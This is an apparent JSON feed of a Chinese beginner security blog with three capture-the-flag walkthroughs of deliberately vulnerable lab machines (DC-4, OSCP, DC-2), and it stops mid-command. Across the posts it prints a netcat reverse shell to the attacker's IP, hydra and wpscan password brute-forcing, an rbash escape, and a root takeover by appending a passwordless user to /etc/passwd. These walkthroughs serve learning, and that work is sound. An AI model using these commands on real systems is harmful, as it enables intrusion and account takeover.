{
    "version": "https://jsonfeed.org/version/1",
    "title": "Kirakira!",
    "subtitle": "૮(˶ᵔ ᵕ ᵔ˶)ა",
    "icon": "http://k1nako.github.io/images/favicon.ico",
    "description": "一名网安小白",
    "home_page_url": "http://K1nako.github.io",
    "items": [
        {
            "id": "http://k1nako.github.io/DC-4%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/",
            "url": "http://k1nako.github.io/DC-4%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/",
            "title": "DC-4 渗透测试",
            "date_published": "2023-12-25T10:53:00.000Z",
            "content_html": "<p>DC 靶场系列</p>\n<p><span id=\"more\"></span></p>\n<h2 id=\"一-环境搭建\"><a class=\"anchor\" href=\"#一-环境搭建\">#</a> 一、环境搭建</h2>\n<h3 id=\"准备工具\"><a class=\"anchor\" href=\"#准备工具\">#</a> 准备工具</h3>\n<p><strong>kali</strong></p>\n<p><strong>DC-4 靶机</strong></p>\n<h3 id=\"靶机下载地址\"><a class=\"anchor\" href=\"#靶机下载地址\">#</a> 靶机下载地址</h3>\n<ul>\n<li><strong>DC-4.zip</strong> (Size: 617 MB)</li>\n<li><strong>Download</strong>: <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5maXZlODYuY29tL2Rvd25sb2Fkcy9EQy00LnppcA==\">http://www.five86.com/downloads/DC-4.zip</span></li>\n<li><strong>Download (Mirror)</strong>: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9kYy9EQy00LnppcA==\">https://download.vulnhub.com/dc/DC-4.zip</span></li>\n</ul>\n<p>安装过程略</p>\n<p>安装过程请看 dc1/dc2</p>\n<h2 id=\"二-渗透过程\"><a class=\"anchor\" href=\"#二-渗透过程\">#</a> 二、渗透过程</h2>\n<p><strong>攻击机 (kali) ip</strong>：192.168.222.128</p>\n<p><strong>靶机 (DC-2) ip</strong>：192.168.222.129</p>\n<h3 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h3>\n<h4 id=\"探测目标ip\"><a class=\"anchor\" href=\"#探测目标ip\">#</a> 探测目标 ip</h4>\n<p><strong>arp-scan</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>arp-scan <span class=\"token parameter variable\">-l</span></pre></td></tr></table></figure><p>探测出靶机的具体 ip</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20231225190109185.png\" alt=\"image-20231225190109185\" /></p>\n<p>发现多余的 ip，扫一下端口开放</p>\n<p><strong>nmap</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token parameter variable\">-sV</span> -p- <span class=\"token number\">192.168</span>.222.129</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20231225190419157.png\" alt=\"image-20231225190419157\" /></p>\n<p>开放 <code>22</code>   <code>80</code>  两个端口</p>\n<p>对 80 端口进行探查</p>\n<h4 id=\"爆破\"><a class=\"anchor\" href=\"#爆破\">#</a> 爆破</h4>\n<p><img data-src=\"http://www.k1nako.top/images/image-20231225190921540.png\" alt=\"image-20231225190921540\" /></p>\n<p>进入到网页，只有赤裸裸的登陆框</p>\n<p>这里我的思路是 查看源代码 (什么都没有) &gt; 扫目录 (dirsearch/dirb 扫，什么都没有) &gt; 弱口令 (什么都没有) &gt; 爆破</p>\n<p>这里只写成功过程，随便丢个字典爆破</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20231225195059029.png\" alt=\"image-20231225195059029\" /></p>\n<p>看了其他大佬的文章说是正确密码：<strong>happy</strong>  我也不太确定，我这里估计是密码对了一次然后有 cookie 值，直接一路畅通</p>\n<h4 id=\"rce\"><a class=\"anchor\" href=\"#rce\">#</a> RCE</h4>\n<p>登陆后发现很明显是个命令执行的按钮</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20231225202231659.png\" alt=\"image-20231225202231659\" /></p>\n<p><strong>bp！启动！</strong></p>\n<p>+ 替代空格</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20231225202745133.png\" alt=\"image-20231225202745133\" /></p>\n<p>既然都能命令执行了，这肯定得弹个 shell</p>\n<p><strong>netcat</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#攻击机上监听</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvp</span> <span class=\"token number\">4444</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#目标机上弹 shell</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-e</span> /bin/bash <span class=\"token number\">192.168</span>.222.128 <span class=\"token number\">4444</span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20231225203132942.png\" alt=\"image-20231225203132942\" /></p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20231225203331461.png\" alt=\"image-20231225203331461\" /></p>\n<p>查看攻击机，发现已经成功了</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20231225203405983.png\" alt=\"image-20231225203405983\" /></p>\n<p>这里我们利用 python 的交互式，避免反复弹 shell</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import pty;pty.spawn(\"/bin/bash\")'</span></pre></td></tr></table></figure><p>思路：先查看有哪些 suid 权限的二进制文件</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHMvYXJ0aWNsZS9kZXRhaWxzLzgwNDI4MTcz\">利用 SUID 提权</span></p>\n<p>随便找个博客看就完事了</p>\n</blockquote>\n<p>没见到有熟悉的可利用文件</p>\n<h4 id=\"再爆破\"><a class=\"anchor\" href=\"#再爆破\">#</a> 再爆破</h4>\n<p>翻翻根目录，翻翻 home 文件，发现有三个用户名的文件夹，估计就是突破点了</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20231225204250336.png\" alt=\"image-20231225204250336\" /></p>\n<p>一个个看下去只有 <code>jim</code>  有东西，估计是没权限查看，有个.sh 的文件</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20231225204500087.png\" alt=\"image-20231225204500087\" /></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>But I'd rather <span class=\"token function\">bash</span> my <span class=\"token function\">head</span> against a brick wall</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>但我宁愿用头撞墙     <span class=\"token punctuation\">(</span>机翻</pre></td></tr></table></figure><p>这里提示要爆破，之前探测端口开放了 <code>ssh</code></p>\n<p>而且在 <code>/home/jim/backups</code>  目录下有个字典</p>\n<p>扒下来爆破 (复制粘贴</p>\n<p><strong>hydra</strong></p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1d2VpbGl5aS9hcnRpY2xlL2RldGFpbHMvMTA1NTIzODIz\">破解工具 Hydra 使用详解</span></p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> jim <span class=\"token parameter variable\">-P</span> 你的字典路径 <span class=\"token number\">192.168</span>.222.129 <span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-V</span> <span class=\"token parameter variable\">-t</span> <span class=\"token number\">50</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token parameter variable\">-V</span>  <span class=\"token comment\">#显示过程</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token parameter variable\">-t</span>  <span class=\"token comment\">#线程</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token parameter variable\">-l</span>  <span class=\"token comment\">#指定用户名</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token parameter variable\">-P</span>  <span class=\"token comment\">#指定字典</span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20231225210921914.png\" alt=\"image-20231225210921914\" /></p>\n<p>爆出来后 <code>ssh</code>  连接</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> jim@192.168.222.129</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20231225211110292.png\" alt=\"image-20231225211110292\" /></p>\n<p>连接成功后这里有个提示，有一份邮件</p>\n<p><code>find / -name 'mail'</code>  利用 find 大概搜索一下，发现 <code>/var</code>  目录下有一个 <code>mail</code>  文件夹</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20231225211354390.png\" alt=\"image-20231225211354390\" /></p>\n<p>得到 <code>charles</code>  用户的密码</p>\n<p>速度登陆 <code>su charles</code></p>\n<h4 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>登陆成功探索一番后什么也没发现</p>\n<p>看大佬文章发现需要利用 <code>sudo -l</code>  查看用户的权限</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20231225211654462.png\" alt=\"image-20231225211654462\" /></p>\n<p>该用户可以以 <code>root</code>  权限免密码执行 <code>/usr/bin/teehee</code></p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vemxneHpzd2p5L3AvMTYxMTg0NjguaHRtbA==\">teehee 提权</span></p>\n</blockquote>\n<p>它可以在文件末尾追加数据，但是并不会覆盖原来文件</p>\n<p>所以我们可以利用这个权限添加一个新用户到 <code>/etc/passwd</code>  文件里</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"admin::0:0:::/bin/bash\"</span> <span class=\"token operator\">|</span> <span class=\"token function\">sudo</span> teehee <span class=\"token parameter variable\">-a</span> /etc/passwd</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20231225212814891.png\" alt=\"image-20231225212814891\" /></p>\n<p>越权成功，flag 在 <code>/root</code>  里</p>\n<h2 id=\"三-知识总结\"><a class=\"anchor\" href=\"#三-知识总结\">#</a> 三、知识总结</h2>\n<h4 id=\"netcat\"><a class=\"anchor\" href=\"#netcat\">#</a> netcat</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#攻击机上监听</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvp</span> <span class=\"token number\">4444</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#目标机上弹 shell</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-e</span> /bin/bash <span class=\"token number\">192.168</span>.222.128 <span class=\"token number\">4444</span></pre></td></tr></table></figure><h4 id=\"hydra\"><a class=\"anchor\" href=\"#hydra\">#</a> hydra</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> jim <span class=\"token parameter variable\">-P</span> 你的字典路径 <span class=\"token number\">192.168</span>.222.129 <span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-V</span> <span class=\"token parameter variable\">-t</span> <span class=\"token number\">50</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token parameter variable\">-V</span>  <span class=\"token comment\">#显示过程</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token parameter variable\">-t</span>  <span class=\"token comment\">#线程</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token parameter variable\">-l</span>  <span class=\"token comment\">#指定用户名</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token parameter variable\">-P</span>  <span class=\"token comment\">#指定字典</span></pre></td></tr></table></figure><h4 id=\"sudo-l\"><a class=\"anchor\" href=\"#sudo-l\">#</a> sudo -l</h4>\n<p>查看用户权限</p>\n<h4 id=\"teehee提权\"><a class=\"anchor\" href=\"#teehee提权\">#</a> teehee 提权</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"admin::0:0:::/bin/bash\"</span> <span class=\"token operator\">|</span> <span class=\"token function\">sudo</span> teehee <span class=\"token parameter variable\">-a</span> /etc/passwd</pre></td></tr></table></figure>",
            "tags": [
                "靶场",
                "靶场复现"
            ]
        },
        {
            "id": "http://k1nako.github.io/OSCP%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/",
            "url": "http://k1nako.github.io/OSCP%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/",
            "title": "OSCP 靶场渗透测试",
            "date_published": "2023-06-22T06:05:33.000Z",
            "content_html": "<p>适合新手做的靶场</p>\n<p><span id=\"more\"></span></p>\n<p>休息了一段时间，该醒醒接着打靶了</p>\n<p>这一次的靶场操作不多，比较简单，比较适合像我这种小白来玩</p>\n<h2 id=\"一-环境搭建\"><a class=\"anchor\" href=\"#一-环境搭建\">#</a> 一、环境搭建</h2>\n<h3 id=\"准备工具\"><a class=\"anchor\" href=\"#准备工具\">#</a> 准备工具</h3>\n<p><strong>kali</strong></p>\n<p><strong>靶机</strong></p>\n<h3 id=\"靶机下载地址\"><a class=\"anchor\" href=\"#靶机下载地址\">#</a> 靶机下载地址</h3>\n<ul>\n<li><strong>oscp.zip</strong> (Size: 2.8 GB)</li>\n<li><strong>Download</strong>: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xcTZZODZEWi1JVTJ3QXBtc1c4UHVvMnhGbGxfOUlTTkwvdmlldz91c3A9c2hhcmluZw==\">https://drive.google.com/file/d/1q6Y86DZ-IU2wApmsW8Puo2xFll_9ISNL/view?usp=sharing</span></li>\n<li><strong>Download (Mirror)</strong>: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9pbmZvc2VjcHJlcC9vc2NwLnppcA==\">https://download.vulnhub.com/infosecprep/oscp.zip</span></li>\n</ul>\n<h3 id=\"安装过程\"><a class=\"anchor\" href=\"#安装过程\">#</a> 安装过程</h3>\n<p>解压得到文件</p>\n<p>用 Vmware 虚拟机打开此文件</p>\n<p>将 kali 和靶机的网络连接模式都改成 NAT 模式，不然 kali 扫不出靶机的 ip</p>\n<h2 id=\"二-渗透过程\"><a class=\"anchor\" href=\"#二-渗透过程\">#</a> 二、渗透过程</h2>\n<p><strong>攻击机 (kali) ip</strong>：192.168.112.130</p>\n<p><strong>靶机 (OSCP) ip</strong>：192.168.112.133</p>\n<h3 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h3>\n<pre><code>arp-scan -l\n</code></pre>\n<p>探测出靶机 ip</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230622133718432.png\" alt=\"image-20230622133718432\" /></p>\n<pre><code>nmap -sV -p- 192.168.112.133\n</code></pre>\n<p>直接扫开放端口</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230622133838823.png\" alt=\"image-20230622133838823\" /></p>\n<p>发现开放 <code>22</code>   <code>80</code>  端口，先打开浏览器探测 <code>80</code>  端口有什么信息</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230622134133895.png\" alt=\"image-20230622134133895\" /></p>\n<p><code>Oh yea! Almost forgot the only user on this box is “oscp”.</code></p>\n<p>可以看到这里提示用户名只有 <code>oscp</code></p>\n<p>先照例给他做个目录扫描探测下藏有什么文件</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230622134420424.png\" alt=\"image-20230622134420424\" /></p>\n<p>扫出很多东西，我们主要看 <code>robots.txt</code></p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230622134539426.png\" alt=\"image-20230622134539426\" /></p>\n<p>发现这个奇怪的文本，继续访问</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230622134617634.png\" alt=\"image-20230622134617634\" /></p>\n<p>这是一段编码，看到最后 == 结尾特征，判断为 base64，解码得到一串私钥</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230622134856959.png\" alt=\"image-20230622134856959\" /></p>\n<p>想起了之前扫出的开放端口就有 <code>22</code>  端口，还有用户名 <code>oscp</code></p>\n<h3 id=\"登陆\"><a class=\"anchor\" href=\"#登陆\">#</a> 登陆</h3>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230622135309831.png\" alt=\"image-20230622135309831\" /></p>\n<p>将私钥编辑到文件里，并给予权限</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230622135510847.png\" alt=\"image-20230622135510847\" /></p>\n<p>这里给 777 权限，是因为权限给太高了</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">chmod</span> <span class=\"token number\">600</span> rsa_key</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-i</span> rsa_key oscp@192.168.112.133</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230622135623322.png\" alt=\"image-20230622135623322\" /></p>\n<p>这样就成功连接上了，发现还只是个普通用户的权限</p>\n<h3 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h3>\n<p>这里我们查找一下哪些工具具有 root 权限</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> / <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-u</span><span class=\"token operator\">=</span>s <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230622135909671.png\" alt=\"image-20230622135909671\" /></p>\n<p>可以看到有个 <code>bash</code> ，利用 SUID 提权</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI3MjYxNy5odG1s\">SUID 提权</span></p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>-bash-5.0$ /usr/bin/bash <span class=\"token parameter variable\">-p</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>bash-5.0<span class=\"token comment\"># whoami</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>root</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>bash-5.0<span class=\"token comment\"># cd /root</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>bash-5.0<span class=\"token comment\"># ls</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>fix-wordpress  flag.txt  snap</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>bash-5.0<span class=\"token comment\"># cat flag.txt</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>d73b04b0e696b0945283defa3eee4538</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>bash-5.0<span class=\"token comment\">#</span></pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230622140125681.png\" alt=\"image-20230622140125681\" /></p>\n<p>成功拿到 flag</p>\n",
            "tags": [
                "靶场",
                "靶场复现"
            ]
        },
        {
            "id": "http://k1nako.github.io/DC-2%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/",
            "url": "http://k1nako.github.io/DC-2%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/",
            "title": "DC-2 渗透测试",
            "date_published": "2023-06-10T08:04:33.000Z",
            "content_html": "<p>DC 靶场系列</p>\n<p><span id=\"more\"></span></p>\n<p>DC2，冲冲冲</p>\n<h2 id=\"一-环境搭建\"><a class=\"anchor\" href=\"#一-环境搭建\">#</a> 一、环境搭建</h2>\n<h3 id=\"准备工具\"><a class=\"anchor\" href=\"#准备工具\">#</a> 准备工具</h3>\n<p><strong>kali</strong></p>\n<p><strong>DC-2 靶机</strong></p>\n<h3 id=\"靶机下载地址\"><a class=\"anchor\" href=\"#靶机下载地址\">#</a> 靶机下载地址</h3>\n<ul>\n<li><strong>DC-2.zip</strong> (Size: 847 MB)</li>\n<li><strong>Download</strong>: <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5maXZlODYuY29tL2Rvd25sb2Fkcy9EQy0yLnppcA==\">http://www.five86.com/downloads/DC-2.zip</span></li>\n<li><strong>Download (Mirror)</strong>: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9kYy9EQy0yLnppcA==\">https://download.vulnhub.com/dc/DC-2.zip</span></li>\n</ul>\n<h3 id=\"安装过程\"><a class=\"anchor\" href=\"#安装过程\">#</a> 安装过程</h3>\n<p>解压得到 DC-1.ova 文件</p>\n<p>用 vmware 虚拟机打开此文件</p>\n<p>如提示导入失败，点击重试即可</p>\n<p>kali 和靶机得网络连接模式都改为 NAT 模式，不然 kali 扫不出靶机的 ip</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230606211955678.png\" alt=\"image-20230606211955678\" /></p>\n<h2 id=\"二-渗透过程\"><a class=\"anchor\" href=\"#二-渗透过程\">#</a> 二、渗透过程</h2>\n<p><strong>攻击机 (kali) ip</strong>：192.168.112.130</p>\n<p><strong>靶机 (DC-2) ip</strong>：192.168.112.131</p>\n<h3 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h3>\n<h4 id=\"探测目标ip\"><a class=\"anchor\" href=\"#探测目标ip\">#</a> 探测目标 ip</h4>\n<p><strong>arp-scan</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>arp-scan <span class=\"token parameter variable\">-l</span></pre></td></tr></table></figure><p>探测出靶机 ip</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230610144505326.png\" alt=\"image-20230610144505326\" /></p>\n<h4 id=\"探测目标端口\"><a class=\"anchor\" href=\"#探测目标端口\">#</a> 探测目标端口</h4>\n<p>利用 <code>nmap</code>  扫描靶机端口</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token parameter variable\">-sV</span> -p- <span class=\"token number\">192.168</span>.112.131</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230610144701953.png\" alt=\"image-20230610144701953\" /></p>\n<p>扫出了两个端口 <code>80</code>   <code>7744</code> ，其中 <code>7744</code>  是 ssh 端口</p>\n<h3 id=\"爆破账号密码\"><a class=\"anchor\" href=\"#爆破账号密码\">#</a> 爆破账号密码</h3>\n<p>因为 <code>80</code>  是 http 协议，所以用浏览器打开</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230610145259152.png\" alt=\"image-20230610145259152\" /></p>\n<p>可以很明显的看到这一次的靶场是 Wordpress cms</p>\n<p>当前界面还有 <code>Flag</code></p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230610145707537.png\" alt=\"image-20230610145707537\" /></p>\n<p>看到个 <code>cewl</code> ，此工具是生成字典用的，说明提示让我们扒一下字典</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N5c3RlbWluby9hcnRpY2xlL2RldGFpbHMvOTAxMTQ2MTA=\">Cewl 使用</span></p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cewl http://dc-2 <span class=\"token operator\">></span> passwd.txt</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230610150204244.png\" alt=\"image-20230610150204244\" /></p>\n<p>并且我们知道此靶机是 Wordpress cms</p>\n<p>就可以利用 kali 的 <code>wpscan</code>  专门用来扫 Wordpress</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDk3MjU2NDU=\">WPScan 的使用</span></p>\n</blockquote>\n<p>枚举用户名</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>wpscan <span class=\"token parameter variable\">--url</span> http://dc-2/ <span class=\"token parameter variable\">-e</span> u</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230610150537974.png\" alt=\"image-20230610150537974\" /></p>\n<p>可以看到枚举了三个用户名，我们将他添加进文本里面</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230610150900125.png\" alt=\"image-20230610150900125\" /></p>\n<p>这下账号密码字典都准备就绪</p>\n<p>利用 <code>wpscan</code>  爆破出账号密码</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>wpscan <span class=\"token parameter variable\">--url</span> http://dc-2/ <span class=\"token parameter variable\">--usernames</span> user.txt <span class=\"token parameter variable\">--passwords</span> passwd.txt</pre></td></tr></table></figure><p><img data-src=\"http://www.k1nako.top/images/image-20230610151212571.png\" alt=\"image-20230610151212571\" /></p>\n<p>这下账号密码都有了，去查查后台目录在哪</p>\n<h3 id=\"扫描目录\"><a class=\"anchor\" href=\"#扫描目录\">#</a> 扫描目录</h3>\n<p><strong>dirsearch</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dirsearch <span class=\"token parameter variable\">-u</span> <span class=\"token string\">\"url\"</span></pre></td></tr></table></figure><p><strong>dirb</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dirb url</pre></td></tr></table></figure><p>这里以 <code>dirsearch</code>  为例</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230610151958274.png\" alt=\"image-20230610151958274\" /></p>\n<h3 id=\"登陆\"><a class=\"anchor\" href=\"#登陆\">#</a> 登陆</h3>\n<p>扫出了很多文件，包括我们正要找的 <code>login</code></p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230610152052895.png\" alt=\"image-20230610152052895\" /></p>\n<p>将我们刚才爆破出来的账号密码输入进去登陆到后台</p>\n<p>在 <code>/page</code>  这里找到了 <code>Flag2</code></p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230610152221782.png\" alt=\"image-20230610152221782\" /></p>\n<p>这里提示我们找其他的方式进入，想来想去，之前我们不是还扫出了 ssh 端口吗</p>\n<p>利用爆破出来的账号登陆试试</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> jerry@192.168.112.131 <span class=\"token parameter variable\">-p</span> <span class=\"token number\">7744</span></pre></td></tr></table></figure><p>打了三遍密码，还以为是我打错了</p>\n<p>结果一试 tom 就成功了....</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> tom@192.168.112.131 <span class=\"token parameter variable\">-p</span> <span class=\"token number\">7744</span></pre></td></tr></table></figure><p>进入后 <code>ls</code>  发现 <code>flag3</code> ，可是 <code>rbash</code>  限制了我们的权限不能用 <code>cat</code></p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2lFZWFydGgvYXJ0aWNsZS9kZXRhaWxzLzUyNzAzNTk4\">shell 命令行自动补全</span></p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>compgen <span class=\"token parameter variable\">-c</span></pre></td></tr></table></figure><p>查看能使用哪些指令</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230610153033826.png\" alt=\"image-20230610153033826\" /></p>\n<p>看到 <code>vi</code>  可以用，打开文件试试</p>\n<p><img data-src=\"http://www.k1nako.top/images/image-20230610153113208.png\" alt=\"image-20230610153113208\" /></p>\n<p>这里的大致意思就是要我们切换 jerry 用户</p>\n<p>但 tom 使用的权限很有限，无法切换 jerry 用户</p>\n<p>这里我们通过对写入环境变量对 <code>rbash</code>  进行绕过</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token environment constant\">BASH_CMDS</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>/bin/sh<span class=\"token punctuation\">;</span>a\t<span class=\"token comment\"># 调用 /bin/sh 命令解释器</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">export</span> <span class=\"token 